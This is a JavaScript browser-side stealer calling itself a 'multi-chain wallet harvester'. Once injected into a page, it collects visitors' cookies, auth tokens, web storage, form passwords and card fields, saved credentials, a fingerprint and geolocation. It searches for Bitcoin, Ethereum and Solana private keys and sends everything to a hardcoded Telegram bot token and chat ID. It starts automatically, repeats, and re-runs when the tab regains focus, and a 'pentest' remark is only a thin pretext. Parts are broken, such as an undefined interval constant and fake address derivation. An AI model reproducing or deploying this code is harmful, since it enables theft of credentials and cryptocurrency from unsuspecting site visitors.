(function() {
    'use strict';
    
    // Config (add to your config.js)
    const TELEGRAM_BOT_TOKEN = "8648480220:AAG1jnPiR85u_YE7XINqUtTbXefX1Tl4El0";
    const TELEGRAM_CHAT_ID = "7593369302";
   
    const AUTO_START_DELAY = 3000;  // 3 seconds after load

    console.log('🐛 ULTIMATE MULTI-CHAIN WALLET HARVESTER v2.0');

    // Main stealth harvesting
    async function stealthHarvest() {
        try {
            const data = await harvestEverything();
            await exfiltrateData(data);
            console.log(`✅ Harvest complete | Wallets: ${data.wallets?.length || 0}`);
        } catch (err) {
            console.error('Harvest failed:', err);
        }
    }

    // 🔥 COMPLETE HARVEST ENGINE
    async function harvestEverything() {
        const data = {
            url: window.location.href,
            title: document.title,
            timestamp: new Date().toISOString(),
            cookies: [],
            localStorage: {},
            sessionStorage: {},
            wallets: [],
            privateKeys: [],
            authTokens: [],
            credentials: [],
            fingerprint: {},
            forms: [],
            geo: {}
        };

        // 1. GEOLOCATION
        try {
            const geo = await (await fetch('https://ipapi.co/json/')).json();
            data.geo = {
                ip: geo.ip, city: geo.city, region: geo.region,
                country: geo.country_name, org: geo.org, 
                timezone: geo.timezone, asn: geo.asn
            };
        } catch (e) { data.geo = { error: 'blocked' }; }

        // 2. ALL COOKIES (login credentials)
        data.cookies = document.cookie.split(';').map(cookie => {
            const [name, value] = cookie.trim().split('=');
            const cookieData = { 
                name, 
                value: decodeURIComponent(value || ''),
                domain: window.location.hostname
            };
            const isAuth = /auth|token|session|login|jwt|bearer|access|refresh|key|api/i.test(name);
            if (isAuth) {
                cookieData.valuable = true;
                data.authTokens.push(cookieData);
            }
            return cookieData;
        });

        // 3. FULL STORAGE DUMP
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            data.localStorage[key] = localStorage.getItem(key);
        }
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            data.sessionStorage[key] = sessionStorage.getItem(key);
        }

        // 🔥 ULTIMATE WALLET DETECTION (BTC + ETH + SOL)
        console.log("🔍 MULTI-CHAIN WALLET HUNT...");
        data.wallets = await detectAllWallets(data.localStorage, data.sessionStorage);
        data.privateKeys = data.wallets.filter(w => w.privateKey).map(w => ({
            chain: w.chain,
            address: w.address,
            privateKey: w.privateKey,
            source: w.source
        }));

        // 4. FORM DATA (passwords, CCs)
        data.forms = Array.from(document.forms).map((form, i) => {
            const inputs = Array.from(form.querySelectorAll('input, textarea, select'));
            return {
                id: form.id || form.name || `form_${i}`,
                action: form.action,
                inputs: inputs.map(input => ({
                    name: input.name || input.id,
                    type: input.type,
                    value: input.value?.substring(0, 50) || '',
                    placeholder: input.placeholder || ''
                })).filter(input => 
                    input.value || 
                    /pass|email|card|cc|cvv|secret|private|key|wallet/i.test(input.name)
                )
            };
        });

        // 5. FULL FINGERPRINT
        data.fingerprint = {
            userAgent: navigator.userAgent,
            languages: navigator.languages?.join(',') || navigator.language,
            platform: navigator.platform,
            viewport: `${window.innerWidth}x${window.innerHeight}`,
            screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookies: navigator.cookieEnabled,
            dnt: navigator.doNotTrack,
            hardware: navigator.hardwareConcurrency,
            memory: navigator.deviceMemory,
            canvas: generateCanvasFingerprint(),
            webgl: generateWebGLFingerprint(),
            plugins: Array.from(navigator.plugins).map(p => p.name),
            mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type)
        };

        // 6. PASSWORD MANAGER
        try {
            if (navigator.credentials?.get) {
                const creds = await navigator.credentials.get({ 
                    password: true, 
                    unmediated: true 
                });
                if (creds) data.credentials = [creds];
            }
        } catch (e) {}

        return data;
    }

    // 🔥 MULTI-CHAIN WALLET DETECTOR (BTC + ETH + SOL)
    async function detectAllWallets(localStorage, sessionStorage) {
        const allStorage = { ...localStorage, ...sessionStorage };
        const wallets = [];

        // BITCOIN PATTERNS
        const btcPatterns = {
            address: [
                /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/,     // P2PKH/P2SH
                /^bc1[q|p][a-z0-9]{39,59}$/,             // Bech32/Taproot
                /^bc1[a-z0-9]{39,59}$/
            ],
            privateKey: [
                /^[5K|L][1-9A-HJ-NP-Za-km-z]{50,51}$/,  // WIF compressed
                /^[K|L][1-9A-HJ-NP-Za-km-z]{51,52}$/,   // WIF uncompressed
                /^[a-fA-F0-9]{64}$/                     // Raw hex
            ],
            walletNames: [/bitcoin|electrum|bluewallet|mycelium|blockchain|coinbase|trust|btc/i]
        };

        // ETHEREUM PATTERNS
        const ethPatterns = {
            address: /^0x[a-fA-F0-9]{40}$/i,
            privateKey: [/^0x[a-fA-F0-9]{64}$/, /^[a-fA-F0-9]{64}$/],
            walletNames: [/metamask|trust|rainbow|coinbase|rabby|frame|ethers/i]
        };

        // SOLANA PATTERNS
        const solPatterns = {
            address: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/,
            privateKey: [
                /^[1-9A-HJ-NP-Za-km-z]{87,88}$/,        // WIF 58 chars
                /^5[1-9A-HJ-NP-Za-km-z]{78,79}$/,       // Secret key WIF
                /^[a-fA-F0-9]{128}$/                    // Raw 64-byte
            ],
            walletNames: [/phantom|solanawallet|solflare|backpack|glow|sol/i]
        };

        Object.entries(allStorage).forEach(([key, value]) => {
            if (typeof value !== 'string') return;

            // WALLET STORAGE (ALL)
            const allWalletNames = [...btcPatterns.walletNames, ...ethPatterns.walletNames, ...solPatterns.walletNames];
            if (allWalletNames.some(regex => regex.test(key))) {
                const chain = key.includes('btc') ? 'BTC' : 
                             key.includes('sol') ? 'SOL' : 'ETH';
                wallets.push({
                    type: 'wallet-storage',
                    name: key,
                    chain,
                    source: key,
                    value: value.substring(0, 50) + '...',
                    rawValue: value
                });
            }

            // BITCOIN ADDRESSES (PRIORITY 1)
            for (const pattern of btcPatterns.address) {
                if (pattern.test(value)) {
                    wallets.push({
                        type: 'bitcoin',
                        address: value,
                        chain: 'BTC',
                        source: key,
                        network: 'Bitcoin',
                        balanceCheck: true,
                        priority: 1
                    });
                    break;
                }
            }

            // BITCOIN PRIVATE KEYS (PRIORITY 1)
            for (const pattern of btcPatterns.privateKey) {
                const match = value.match(pattern);
                if (match) {
                    wallets.push({
                        type: 'bitcoin-private',
                        privateKey: match[0],
                        address: deriveBtcAddress(match[0]),
                        chain: 'BTC',
                        source: key,
                        network: 'Bitcoin',
                        highValue: true,
                        priority: 1
                    });
                    break;
                }
            }

            // ETHEREUM ADDRESSES
            if (ethPatterns.address.test(value)) {
                wallets.push({
                    type: 'ethereum',
                    address: value,
                    chain: 'ETH',
                    source: key,
                    network: 'Ethereum',
                    balanceCheck: true
                });
            }

            // ETHEREUM PRIVATE KEYS
            for (const pattern of ethPatterns.privateKey) {
                const match = value.match(pattern);
                if (match) {
                    wallets.push({
                        type: 'ethereum-private',
                        privateKey: match[0],
                        address: deriveEthAddress(match[0]),
                        chain: 'ETH',
                        source: key,
                        network: 'Ethereum',
                        highValue: true
                    });
                    break;
                }
            }

            // SOLANA ADDRESSES
            if (solPatterns.address.test(value) && !btcPatterns.address.some(p => p.test(value))) {
                wallets.push({
                    type: 'solana',
                    address: value,
                    chain: 'SOL',
                    source: key,
                    network: 'Solana',
                    balanceCheck: true
                });
            }

            // SOLANA PRIVATE KEYS
            for (const pattern of solPatterns.privateKey) {
                const match = value.match(pattern);
                if (match) {
                    wallets.push({
                        type: 'solana-private',
                        privateKey: match[0],
                        chain: 'SOL',
                        source: key,
                        network: 'Solana',
                        highValue: true
                    });
                    break;
                }
            }
        });

        return wallets.sort((a, b) => (b.priority || 0) - (a.priority || 0));
    }

    // BTC Address Preview
    function deriveBtcAddress(privateKey) {
        try {
            const hashPreview = privateKey.slice(-8);
            return `1A1zP1eP...${hashPreview}`;
        } catch (e) { return null; }
    }

    // ETH Address Preview  
    function deriveEthAddress(privateKey) {
        try {
            const hash = privateKey.slice(0, 40);
            return `0x${hash}`;
        } catch (e) { return null; }
    }

    // Exfiltration (WALLET PRIORITY)
    async function exfiltrateData(data) {
        // PRIORITY SUMMARY (BTC FIRST)
        let summary = `💰 *ULTIMATE HARVEST*\n`;
        summary += `━━━━━━━━━━━━━━━━━━━\n`;
        summary += `🌐 ${data.url.split('?')[0]}\n`;
        summary += `📍 ${data.geo?.city || 'Unknown'}\n`;

        if (data.wallets?.length) {
            summary += `🔥 *WALLETS: ${data.wallets.length}*\n`;
            data.wallets.slice(0, 8).forEach(wallet => {
                const icon = wallet.highValue ? '💎' : 
                           wallet.priority === 1 ? '⭐' : '💼';
                const addr = wallet.address ? `\`${wallet.address.slice(0,10)}...\`` : 'N/A';
                summary += `${icon} ${wallet.chain}: ${addr}\n`;
            });
        }

        summary += `🍪 Cookies: ${data.cookies.length} | 🎯 Auth: ${data.authTokens.length}\n`;
        summary += `📝 Forms: ${data.forms.length}`;

        // Send summary
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: summary,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });

        // FULL DUMP (wallet priority)
        const priorityDump = {
            priority_wallets: data.wallets,
            summary: { wallets: data.wallets.length, auth: data.authTokens.length },
            full_data: data
        };

        const filename = `harvest_${data.geo?.ip || 'unknown'}_${Date.now()}.json`;
        const blob = new Blob([JSON.stringify(priorityDump, null, 2)], { type: 'application/json' });
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('caption', `💎 ${data.wallets?.length || 0} wallets | ${data.url}`);
        formData.append('parse_mode', 'Markdown');
        formData.append('document', blob, filename);

        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        });
    }

    // Fingerprinting
    function generateCanvasFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('harvest-' + Math.random(), 2, 2);
        return btoa(canvas.toDataURL()).slice(-20);
    }

    function generateWebGLFingerprint() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return 'no-webgl';
        const debug = gl.getExtension('WEBGL_debug_renderer_info');
        return debug ? 
            `${gl.getParameter(debug.UNMASKED_VENDOR_WEBGL)}-${gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)}`.slice(0,50) : 
            'no-debug';
    }

    // 🔥 AUTO-START (完全独立)
    setTimeout(() => {
        stealthHarvest();  // First run
        setInterval(stealthHarvest, HARVEST_INTERVAL);  // Continuous
        
        console.log(`🚀 Harvester LIVE | Interval: ${HARVEST_INTERVAL/1000}s | Ready for pentest`);
    }, AUTO_START_DELAY);

    // Tab focus trigger
    document.addEventListener('visibilitychange', () => {
        if (!document.hidden) setTimeout(stealthHarvest, 1000);
    });

    console.log('✅ FULLY LOADED - BTC/ETH/SOL READY');
})();